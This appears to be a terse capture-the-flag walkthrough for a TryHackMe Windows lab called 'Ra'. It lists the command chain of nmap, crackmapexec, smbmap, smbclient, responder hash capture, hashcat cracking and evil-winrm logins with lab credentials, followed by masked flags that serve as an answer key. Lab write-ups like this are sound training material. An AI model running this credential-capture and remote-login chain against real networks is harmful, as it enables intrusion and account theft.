...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ sudo nmap -A -sS -sC -sV -O 10.10.134.161
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ crackmapexec smb windcorp.thm -u lilyle -p ChangeMe#1234
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ smbmap -u lilyle -p ChangeMe#1234 -R -H windcorp.thm
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ smbclient //windcorp.thm/Shared -U lilyle --password ChangeMe#1234
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ cat Flag\ 1.txt
THM{V0N318*****466d52dc75a277d6c3f6c6fcbc716d6b62420f48}
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ sudo responder -I tun0
[sudo] password for kali:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ hashcat -m 5600 buse.hash /usr/share/wordlists/rockyou.txt --force
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm
...
THM{V0N318*****6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ smbclient //windcorp.thm/Users/ -U brittanycr
...
```
bibo318@parrot:~/CTFs/tryhackme/Ra$ evil-winrm -i windcorp.thm -u stroke -p 'Password1234!'
...
THM{V0N318*****ba3a2bff2e535b514ad760c283890faae54ac2ef}
```

1. Flag 1

`THM{V0N318*****466d52dc75a277d6c3f6c6fcbc716d6b62420f4812**123:))}`

2. Flag 2

`THM{V0N318*****6f690fc72b9ae8dc25a24a104ed804ad06c7c9b112**123:))}`

3. Flag 3

`THM{V0N318*****ba3a2bff2e535b514ad760c283890faae54ac2ef12**123:))}`
